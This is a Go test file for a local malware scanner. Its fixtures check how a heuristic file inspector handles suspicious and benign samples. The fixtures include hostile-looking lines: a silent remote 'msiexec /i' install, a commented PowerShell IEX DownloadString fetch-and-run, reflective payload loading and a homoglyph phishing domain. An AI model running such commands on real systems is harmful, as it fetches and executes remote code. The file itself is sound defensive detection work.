package main

import (
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

func TestStage12Stage6TargetAndFalsePositiveLimit(t *testing.T) {
	var tp, fn, fp, tn int
	root := t.TempDir()
	for i, c := range stage6Corpus() {
		p := filepath.Join(root, fmt.Sprintf("case-%03d", i), c.filename)
		if err := os.MkdirAll(filepath.Dir(p), 0700); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(p, []byte(c.content), 0600); err != nil {
			t.Fatal(err)
		}
		st, err := os.Stat(p)
		if err != nil {
			t.Fatal(err)
		}
		f := inspectFile(p, st)
		switch {
		case c.suspicious && f != nil:
			tp++
		case c.suspicious && f == nil:
			fn++
			t.Logf("Uncovered Stage6 signal: %s", c.label)
		case !c.suspicious && f != nil:
			fp++
			t.Errorf("Stage6 benign regression: %s, %v", c.label, f.Reasons)
		default:
			tn++
		}
	}
	t.Logf("STAGE12 STAGE6 TP=%d FN=%d FP=%d TN=%d", tp, fn, fp, tn)
	if tp < 55 || fp > 0 {
		t.Fatalf("Stage 12 expected >=55/65 synthetic positives with zero Stage 6 benign flags")
	}
}

func TestStage12RemoteMSIFalsePositiveFix(t *testing.T) {
	// Inert samples. A Playwright-like script downloads a file and runs the
	// local MSI silently; only a direct remote /i https://...msi should match.
	cases := []struct {
		name, text string
		positive   bool
	}{
		{"reinstall_chrome_stable_win.ps1", `$url = 'https://example.invalid/chrome-stable.msi'
Invoke-WebRequest $url -OutFile $installer
Start-Process msiexec.exe -ArgumentList '/i', $installer, '/qn' -Wait
`, false},
		{"reinstall_chrome_beta_win.ps1", `$downloadURL = 'https://example.invalid/chrome-beta.msi'
Invoke-WebRequest -Uri $downloadURL -OutFile $destination
msiexec.exe /i "$destination" /quiet
`, false},
		{"training.ps1", `# msiexec /i https://example.invalid/update.msi /qn
Write-Host 'This is documentation'`, false},
		{"remote.cmd", `msiexec.exe /i https://example.invalid/update.msi /qn`, true},
		{"remote-first.cmd", `msiexec.exe /quiet /i https://example.invalid/update.msi`, true},
		{"independent.cmd", `echo a safe installer
msiexec.exe /i local.msi /qn
REM https://example.invalid/a`, false},
	}
	dir := t.TempDir()
	for i, c := range cases {
		p := filepath.Join(dir, fmt.Sprintf("%02d", i), c.name)
		if err := os.MkdirAll(filepath.Dir(p), 0700); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(p, []byte(c.text), 0600); err != nil {
			t.Fatal(err)
		}
		info, err := os.Stat(p)
		if err != nil {
			t.Fatal(err)
		}
		f := inspectFile(p, info)
		if (f != nil) != c.positive {
			t.Errorf("%s expected=%v found=%v reasons=%v", c.name, c.positive, f != nil, func() []string {
				if f != nil {
					return f.Reasons
				}
				return nil
			}())
		}
	}
}

func TestStage12ContextualSignalsAndBenignControls(t *testing.T) {
	cases := []struct {
		file, content string
		flag          bool
	}{
		{"inmemory.ps1", "[Reflection.Assembly]::Load($payload)", true},
		{"inmemory-note.ps1", "# [Reflection.Assembly]::Load($payload)\nWrite-Host normal", false},
        {"reflection-clean.ps1", "[Reflection.Assembly]::LoadFrom('C:\\Program Files\\safe.dll')", false},
		{"sign-in.txt", "Please visit paypaл.example.invalid", true},
		{"unicode-doc.txt", "The Cyrillic alphabet includes л and the English alphabet includes l", false},
		{"locked.txt", "All files now end in .locked", true},
		{"manual.txt", "How to change a file extension to .locked manually", false},
		{"sample.jpg", "ordinary pixels could contain a hidden message", true},
		{"photo.jpg", string([]byte{0xff, 0xd8, 0xff, 0xdb, 0, 0, 0}), false},
		{"driver.sys", "this is an ordinary documentation file", false},
		{"disk.iso", "plain test placeholder", false},
		{"normal.js", "crypto.subtle.encrypt({name:'AES-GCM'}, key,data)", false},
		{"example.txt", "https://discord.com/api/webhooks/000/example", false},
		{"comment.ps1", "# IEX (New-Object Net.WebClient).DownloadString('https://example.invalid/x')", false},
	}
	dir := t.TempDir()
	for i, c := range cases {
		p := filepath.Join(dir, fmt.Sprintf("item-%d", i), c.file)
		if err := os.MkdirAll(filepath.Dir(p), 0700); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(p, []byte(c.content), 0600); err != nil {
			t.Fatal(err)
		}
		st, _ := os.Stat(p)
		found := inspectFile(p, st)
		if (found != nil) != c.flag {
			t.Errorf("case %q expected %t result %+v", c.file, c.flag, found)
		}
	}
}

func TestStage12ResourceMetricsResetAndReport(t *testing.T) {
	app := newApp(nil)
	ctx, err := app.begin("heuristic:custom")
	if err != nil {
		t.Fatal(err)
	}
	_ = ctx
	time.Sleep(1100 * time.Millisecond)
	app.finish(nil)
	st, _ := app.snapshot()
	if st.Resources.Samples < 2 || st.Resources.CurrentMemoryMiB <= 0 || st.Resources.PeakMemoryMiB < st.Resources.AverageMemoryMiB || st.Resources.AverageMemoryMiB <= 0 {
		t.Fatalf("resource metrics missing/invalid: %+v", st.Resources)
	}
	if st.Resources.CPUAvailable {
		if st.Resources.PeakCPUPercent < st.Resources.AverageCPUPercent || st.Resources.PeakCPUPercent > 100 {
			t.Fatalf("CPU values invalid: %+v", st.Resources)
		}
	}
	srv := &Server{app: app, token: "testtoken", address: "127.0.0.1:19001"}
	req := httptest.NewRequest(http.MethodGet, "http://127.0.0.1:19001/api/report", nil)
	req.RemoteAddr = "127.0.0.1:12345"
	req.Header.Set("X-Sentinel-Token", "testtoken")
	rec := httptest.NewRecorder()
	srv.routes().ServeHTTP(rec, req)
	var out struct {
		Status  Status `json:"status"`
		Version string `json:"version"`
	}
	if err := json.Unmarshal(rec.Body.Bytes(), &out); err != nil {
		t.Fatal(err)
	}
	if out.Version != "3.3" || out.Status.Resources.Samples < 2 {
		t.Fatalf("missing report metrics %+v", out)
	}
	if _, err := app.begin("heuristic:custom"); err != nil {
		t.Fatal(err)
	}
	again, _ := app.snapshot()
	if again.Resources.Samples > 1 || again.Resources.PeakCPUPercent > 0 {
		t.Fatalf("scan metric reset failed %+v", again.Resources)
	}
	app.finish(nil)
}

func TestStage12UIResourcePanelAndReconnectNotice(t *testing.T) {
	html, err := pages.ReadFile("ui.html")
	if err != nil {
		t.Fatal(err)
	}
	for _, s := range []string{"cpuCurrent", "cpuAverage", "cpuPeak", "memoryCurrent", "memoryAverage", "memoryPeak", "connectionLosses", "last known readings", "v3.3"} {
		if !strings.Contains(string(html), s) {
			t.Errorf("missing UI element/notice %q", s)
		}
	}
}
